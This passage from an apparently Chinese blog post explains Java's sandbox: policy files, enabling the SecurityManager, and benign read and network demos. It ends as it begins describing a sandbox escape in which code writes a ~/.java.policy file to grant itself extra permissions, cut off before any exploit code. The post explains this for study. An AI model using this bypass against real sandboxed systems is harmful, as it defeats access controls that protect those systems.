be expanded in policy</span><br><span class="line"># files.</span><br><span class="line">policy.expandProperties=true</span><br><span class="line"></span><br><span class="line"># whether or not we allow an extra policy to be passed on the command line</span><br><span class="line"># with -Djava.security.policy=somefile. Comment out this line to disable</span><br><span class="line"># this feature.</span><br><span class="line">policy.allowSystemProperty=true</span><br></pre></td></tr></table></figure><p><code>policy.url.*</code>这个属性指明了使用的策略文件，如上文所述，默认的两个位置就在这里配置，用户可以自行更改顺序和存储位置。而policy.allowSystemProperty指明是否允许用户自行通过命令行指定policy文件。</p><h4 id="密钥库"><a href="#密钥库" class="headerlink" title="密钥库"></a>密钥库</h4><p>保存密钥证书的地方。</p><h3 id="默认沙箱"><a href="#默认沙箱" class="headerlink" title="默认沙箱"></a>默认沙箱</h3><p>通过Java命令行启动的Java应用程序，默认不启用沙箱。要想启用沙箱，启动命令需要做如下形式的变更：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.manager &lt;other args&gt;</span><br></pre></td></tr></table></figure><p>沙箱启动后，安全管理器会使用两个默认的策略文件来确定沙箱启动参数。当然也可以通过命令指定：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.policy=&lt;URL&gt;</span><br></pre></td></tr></table></figure><p>如果要求启动时只遵循一个策略文件，那么启动参数要加个等号，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.policy==&lt;URL&gt;</span><br></pre></td></tr></table></figure><h3 id="Java沙箱的应用"><a href="#Java沙箱的应用" class="headerlink" title="Java沙箱的应用"></a>Java沙箱的应用</h3><h4 id="限制读文件"><a href="#限制读文件" class="headerlink" title="限制读文件"></a>限制读文件</h4><p>这个例子很简单，首先写一个r.txt文件，里面的内容是“abcd”，再写个程序如下读取这个r.txt。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PolicyTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">file</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"D:\\github\\CDLib\\src\\main\\resources\\security\\r.txt"</span>);</span><br><span class="line">        InputStream is;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            is = <span class="keyword">new</span> FileInputStream(f);</span><br><span class="line">            <span class="keyword">byte</span>[] content = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">while</span> (is.read(content) != -<span class="number">1</span>) &#123;</span><br><span class="line">                System.out.println(<span class="keyword">new</span> String(content));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// test read file.</span></span><br><span class="line">        file();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现输出是<code>abcd</code>。</p><p>接下来修改Java启动参数，加入<code>-Djava.security.manager</code>，启动了安全沙箱。再运行，输出变成了异常：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.security.AccessControlException: access denied (&quot;java.io.FilePermission&quot; &quot;D:\github\CDLib\src\main\resources\security\r.txt&quot; &quot;read&quot;)</span><br><span class="line">at java.security.AccessControlContext.checkPermission(Unknown Source)</span><br><span class="line">at java.security.AccessController.checkPermission(Unknown Source)</span><br><span class="line">at java.lang.SecurityManager.checkPermission(Unknown Source)</span><br><span class="line">at java.lang.SecurityManager.checkRead(Unknown Source)</span><br><span class="line">at java.io.FileInputStream.(Unknown Source)</span><br><span class="line">at com.taobao.cd.security.PolicyTest.main(PolicyTest.java:15)</span><br></pre></td></tr></table></figure><p>这里已经提示了，访问被拒绝，说明了沙箱启动，同时也验证了默认沙箱——禁止本地文件访问。</p><p>再来，我们构建一个custom.policy文件如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.io.FilePermission &quot;D:\\github\\CDLib\\src\\main\\resources\\security\\*&quot;, &quot;read&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里构建了一条安全策略——允许读取security目录下的文件。</p><p>修改启动命令，添加<code>-Djava.security.policy=D:\\github\\CDLib\\src\\main\\resources\\security\\custom.policy</code>，再执行，结果输出了<code>abcd</code>。</p><p>如上例。我们通过自定义policy文件修改了默认沙箱的安全策略，再通过启动参数开启沙箱模式。这样就可以构造我们自己想要的沙箱效果了。</p><h4 id="限制访问网络"><a href="#限制访问网络" class="headerlink" title="限制访问网络"></a>限制访问网络</h4><p>通过HttpClient访问<code>www.baidu.com</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.taobao.cd.http.util.HttpUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PolicyTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">network</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String text = HttpUtil.createHtmlText(<span class="string">"http://www.baidu.com"</span>, HttpUtil.UA);</span><br><span class="line">            System.out.println(text);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// test use network.</span></span><br><span class="line">        network();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开启默认沙箱后，输出如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">java.security.AccessControlException: access denied (&quot;java.net.SocketPermission&quot; &quot;www.baidu.com&quot; &quot;resolve&quot;)</span><br><span class="line">at java.security.AccessControlContext.checkPermission(Unknown Source)</span><br><span class="line">at java.security.AccessController.checkPermission(Unknown Source)</span><br><span class="line">at java.lang.SecurityManager.checkPermission(Unknown Source)</span><br><span class="line">at java.lang.SecurityManager.checkConnect(Unknown Source)</span><br><span class="line">at java.net.InetAddress.getAllByName0(Unknown Source)</span><br><span class="line">at java.net.InetAddress.getAllByName(Unknown Source)</span><br><span class="line">at java.net.InetAddress.getAllByName(Unknown Source)</span><br><span class="line">at org.apache.http.impl.conn.DefaultClientConnectionOperator.resolveHostname(DefaultClientConnectionOperator.java:242)</span><br><span class="line">at org.apache.http.impl.conn.DefaultClientConnectionOperator.openConnection(DefaultClientConnectionOperator.java:130)</span><br><span class="line">at org.apache.http.impl.conn.AbstractPoolEntry.open(AbstractPoolEntry.java:149)</span><br><span class="line">at org.apache.http.impl.conn.AbstractPooledConnAdapter.open(AbstractPooledConnAdapter.java:121)</span><br><span class="line">at org.apache.http.impl.client.DefaultRequestDirector.tryConnect(DefaultRequestDirector.java:573)</span><br><span class="line">at org.apache.http.impl.client.DefaultRequestDirector.execute(DefaultRequestDirector.java:425)</span><br><span class="line">at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:820)</span><br><span class="line">at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:754)</span><br><span class="line">at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:732)</span><br><span class="line">at com.taobao.cd.http.util.HttpUtil.createHtmlText(HttpUtil.java:38)</span><br><span class="line">at com.taobao.cd.security.PolicyTest.network(PolicyTest.java:15)</span><br><span class="line">at com.taobao.cd.security.PolicyTest.main(PolicyTest.java:45)</span><br></pre></td></tr></table></figure><p>根据错误提示，知道是访问socket没有权限。那么修改下policy，指定权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.net.SocketPermission &quot;www.baidu.com:1-&quot;, &quot;connect,resolve&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在指定权限文件下再运行，得到了正常的text形式的baidu首页的页面文档。权限策略成功。</p><h2 id="0x02-Java-Security-Manager"><a href="#0x02-Java-Security-Manager" class="headerlink" title="0x02 Java Security Manager"></a>0x02 Java Security Manager</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>作为Java沙箱的基本组成部分之一，Java安全管理器是核心API和操作系统之间的主要接口，主要用于实现权限控制。</p><p>安全管理器是一个允许应用实现一种安全策略的类。它允许一个应用去明确在执行一个可能安全或者敏感的操作之前，此操作是否允许在一个安全的上下文中被执行。应用可以同意或者拒绝执行操作。</p><h3 id="SecurityManager类方法"><a href="#SecurityManager类方法" class="headerlink" title="SecurityManager类方法"></a>SecurityManager类方法</h3><p>SecurityManager类包含许多以check开头命名的方法。Java库中的各种方法在执行一些敏感的操作时可以调用这些方法。对check方法典型的调用如下： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SecurityManager security = System.getSecurityManager();</span><br><span class="line"><span class="keyword">if</span> (security != <span class="keyword">null</span>) &#123;</span><br><span class="line">security.checkXXX(argument);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SecurityManager通过抛出异常来阻止没有权限或敏感操作的完成。 如果操作被允许执行，则简单的返回；如果操作被拒绝，则抛出一个SecurityException。对于这种处理方式唯一的例外就是checkTopLevelWindow()方法，此方法返回boolean值。</p><p>设置、获取当前管理器：</p><ul><li>可以使用System类的setSecurityManager()方法来设置当前安全管理器；</li><li>可以使用System类的getSecurityManager()方法来获取当前安全管理器；</li></ul><p>SecurityManager中特定的方法checkPermission(java.security.Permission)负责明确允许还是拒绝由指定权限所指示的访问请求，默认的实现是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AccessController.checkPermission(perm);</span><br></pre></td></tr></table></figure><p>若果一个请求访问被允许，则checkPermission()直接返回；如果被拒绝，则抛出一个SecurityException异常。</p><p>从Java 2 SDK v1.2 开始，SecurityManager 中其他所有check方法的默认实现都是调用SecurityManager的checkPermission()方法来确定调用线程是否具有执行所请求操作的权限。</p><p>注意：只带有单个权限参数的checkPermission()方法总是在当前执行的线程上下文中执行安全检查。有时，应该在给定上下文中进行的安全检查实际上需要在不同的上下文（例如，在一个辅助线程中）中进行。Java为这种情况提供了包含有上下文参数的getSecurityContext()方法和checkPermission()方法。</p><p>getSecurityContext()方法返回当前调用上下文的一个“快照”（默认的实现返回一个 AccessControlContext 对象）。下面是一个示例调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Object context = <span class="keyword">null</span>;</span><br><span class="line">SecurityManager sm = System.getSecurityManager();</span><br><span class="line"><span class="keyword">if</span> (sm != <span class="keyword">null</span>) context = sm.getSecurityContext();</span><br></pre></td></tr></table></figure><p>checkPermission()方法使用一个上下文对象，以及根据该上下文而不是当前执行线程的上下文作出访问决策的权限。因此另一个上下文中的代码可以调用此方法，传递权限和以前保存的上下文对象。下面是一个示例调用，它使用了以前示例中获得的SecurityManager类实例sm：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (sm != <span class="keyword">null</span>) sm.checkPermission(permission, context);</span><br></pre></td></tr></table></figure><p>SecurityManager类的主要方法列表如下，分别囊括了文件的读写删除和执行、网络的连接和监听、线程的访问、以及其他包括打印机剪贴板等系统功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">checkAccept(String, int)</span><br><span class="line">checkAccess(Thread)</span><br><span class="line">checkAccess(ThreadGroup)</span><br><span class="line">checkAwtEventQueueAccess()</span><br><span class="line">checkConnect(String, int)</span><br><span class="line">checkConnect(String, int, Object)</span><br><span class="line">checkCreateClassLoader()</span><br><span class="line">checkDelete(String)</span><br><span class="line">checkExec(String)</span><br><span class="line">checkExit(int)</span><br><span class="line">checkLink(String)</span><br><span class="line">checkListen(int)</span><br><span class="line">checkMemberAccess(Class&lt;?&gt;, int)</span><br><span class="line">checkMulticast(InetAddress)</span><br><span class="line">checkMulticast(InetAddress, byte)</span><br><span class="line">checkPackageAccess(String)</span><br><span class="line">checkPackageDefinition(String)</span><br><span class="line">checkPermission(Permission)</span><br><span class="line">checkPermission(Permission, Object)</span><br><span class="line">checkPrintJobAccess()</span><br><span class="line">checkPropertiesAccess()</span><br><span class="line">checkPropertyAccess(String)</span><br><span class="line">checkRead(FileDescriptor)</span><br><span class="line">checkRead(String)</span><br><span class="line">checkRead(String, Object)</span><br><span class="line">checkSecurityAccess(String)</span><br><span class="line">checkSetFactory()</span><br><span class="line">checkSystemClipboardAccess()</span><br><span class="line">checkTopLevelWindow(Object)</span><br><span class="line">checkWrite(FileDescriptor)</span><br><span class="line">checkWrite(String)</span><br></pre></td></tr></table></figure><h3 id="启动安全管理器"><a href="#启动安全管理器" class="headerlink" title="启动安全管理器"></a>启动安全管理器</h3><h4 id="参数启动"><a href="#参数启动" class="headerlink" title="参数启动"></a>参数启动</h4><p>启动程序的时候通过附加参数启动安全管理器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Djava.security.manager</span><br></pre></td></tr></table></figure><p>如果想指定自定义的实现，可以在java.security.manager加等号指定，如下就能指定net.sourceforge.prograde.sm.ProGradeJSM作为实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Djava.security.manager=net.sourceforge.prograde.sm.ProGradeJSM</span><br></pre></td></tr></table></figure><p>若要同时指定配置文件的位置那么示例如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Djava.security.manager -Djava.security.policy=&quot;E:/java.policy&quot;</span><br></pre></td></tr></table></figure><p>策略文件前面小节已经说过了。一般需要指定哪些类有哪些权限，编辑policy文件就可以了。policy文件的具体语法参看<a href="https://docs.oracle.com/javase/8/docs/technotes/guides/security/PolicyFiles.html" target="_blank" rel="noopener">这里</a>。</p><h4 id="编码方式启动"><a href="#编码方式启动" class="headerlink" title="编码方式启动"></a>编码方式启动</h4><p>也可以通过编码方式启动，不过不建议：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SecurityManager sm = <span class="keyword">new</span> SecurityManager(); </span><br><span class="line">System.setSecurityManager(sm);</span><br></pre></td></tr></table></figure><p>通过参数启动，本质上也是通过编码启动，不过参数启动使用灵活。</p><h3 id="关闭安全管理器"><a href="#关闭安全管理器" class="headerlink" title="关闭安全管理器"></a>关闭安全管理器</h3><p>程序关闭：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SecurityManager sm = System.getSecurityManager(); </span><br><span class="line"><span class="keyword">if</span>(sm != <span class="keyword">null</span>)&#123; System.setSecurityManager(<span class="keyword">null</span>); &#125;</span><br></pre></td></tr></table></figure><p>注意：上面的代码只有在位于<code>${JDK_HOME}/jre/lib/security</code>目录下或者其他指定目录下的java.policy文件中指定了一个权限才会奏效。 这个权限是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">permission java.lang.RuntimePermission &quot;setSecurityManager&quot;;</span><br></pre></td></tr></table></figure><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>FileUtil.java，工具类用于创建文件夹：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.security.AccessControlException;</span><br><span class="line"><span class="keyword">import</span> java.security.AccessController;</span><br><span class="line"><span class="keyword">import</span> java.security.PrivilegedAction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileUtil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String FOLDER_PATH = <span class="string">"C:\\test"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FileUtil</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">makeFile</span><span class="params">(String fileName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            File fs = <span class="keyword">new</span> File(<span class="string">"C:\\test\\"</span> + fileName);</span><br><span class="line">            fs.createNewFile();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | AccessControlException var2) &#123;</span><br><span class="line">            var2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">doPrivilegedAction</span><span class="params">(<span class="keyword">final</span> String fileName)</span> </span>&#123;</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction&lt;String&gt;() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> String <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                FileUtil.makeFile(fileName);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DemoDoPrivilege.java，尝试通过三种方式在指定文件夹下创建新文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.security.AccessControlException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoDoPrivilege</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DemoDoPrivilege</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"***************************************"</span>);</span><br><span class="line">        System.out.println(<span class="string">"I will show AccessControl functionality..."</span>);</span><br><span class="line">        System.out.println(<span class="string">"Preparation step : turn on system permission check..."</span>);</span><br><span class="line">        System.out.println(<span class="string">"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"</span>);</span><br><span class="line">        System.out.println(<span class="string">"Create a new file named temp1.txt via privileged action ..."</span>);</span><br><span class="line">        FileUtil.doPrivilegedAction(<span class="string">"temp1.txt"</span>);</span><br><span class="line">        System.out.println(<span class="string">"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">        System.out.println(<span class="string">"/////////////////////////////////////////"</span>);</span><br><span class="line">        System.out.println(<span class="string">"Create a new file named temp2.txt via File ..."</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            File fs = <span class="keyword">new</span> File(<span class="string">"C:\\test\\temp2.txt"</span>);</span><br><span class="line">            fs.createNewFile();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AccessControlException | IOException var2) &#123;</span><br><span class="line">            var2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"/////////////////////////////////////////"</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">        System.out.println(<span class="string">"-----------------------------------------"</span>);</span><br><span class="line">        System.out.println(<span class="string">"create a new file named temp3.txt via FileUtil ..."</span>);</span><br><span class="line">        FileUtil.makeFile(<span class="string">"temp3.txt"</span>);</span><br><span class="line">        System.out.println(<span class="string">"-----------------------------------------"</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">        System.out.println(<span class="string">"***************************************"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>my.policy，自定义的权限配置文件，本地放在和前面文件同一目录下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">grant&#123;</span><br><span class="line">    permission java.io.FilePermission &quot;C:\\test\\*&quot;, &quot;write&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">grant&#123;</span><br><span class="line">    permission java.security.AllPermission &quot;C:\\test\\*&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>启动安全管理器运行该类，由于权限问题会报java.security.AccessControlException的错误：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.manager DemoDoPrivilege</span><br></pre></td></tr></table></figure><p><img src="/2020/05/03/浅析Java沙箱逃逸/5.png" alt=""></p><p>配置权限参数<code>-Djava.security.policy=my.policy</code>，再次启动则创建成功：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/6.png" alt=""></p><h2 id="0x03-Java沙箱逃逸"><a href="#0x03-Java沙箱逃逸" class="headerlink" title="0x03 Java沙箱逃逸"></a>0x03 Java沙箱逃逸</h2><p>由前面Java沙箱的基础组成部分知道，除了Java安全管理器外，其他的基本都是内置实现在JVM和Java语言中的，也就是说，只有Java安全管理器可以被外部用户控制来设置策略文件等。因此，Java沙箱逃逸，实际就是针对Java Security Manager的绕过。</p><h3 id="利用单等号-home目录可写绕过"><a href="#利用单等号-home目录可写绕过" class="headerlink" title="利用单等号+home目录可写绕过"></a>利用单等号+home目录可写绕过</h3><h4 id="Bypass利用"><a href="#Bypass利用" class="headerlink" title="Bypass利用"></a>Bypass利用</h4><p>jre/lib/security/java.security是Java中指定安全配置文件，在前面的java.security小节中看到，其中指定了两个默认的policy文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># The default is to have a single system-wide policy file,</span><br><span class="line"># and a policy file in the user&apos;s home directory.</span><br><span class="line">policy.url.1=file:$&#123;java.home&#125;/lib/security/java.policy</span><br><span class="line">policy.url.2=file:$&#123;user.home&#125;/.java.policy</span><br></pre></td></tr></table></figure><p>而通过<code>-Djava.security.policy</code>指定policy文件时，如果参数后面是一个等号，例如<code>-Djava.security.policy=my.policy</code>，m.policy会加在上面的两个默认的policy文件之后。在默认情况下，home目录下没有.java.policy这个文件。因此，如果home目录可写，则恶意代码可以通过写.java.policy文件，授予自己更多的权限来绕过Java Security Manager。</p><p>假设开发者自定义的策略文件my.policy，虽然没有赋予文件的执行权限，但允许home目录可写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant&#123;</span><br><span class="line">    permission java.io.FilePermission 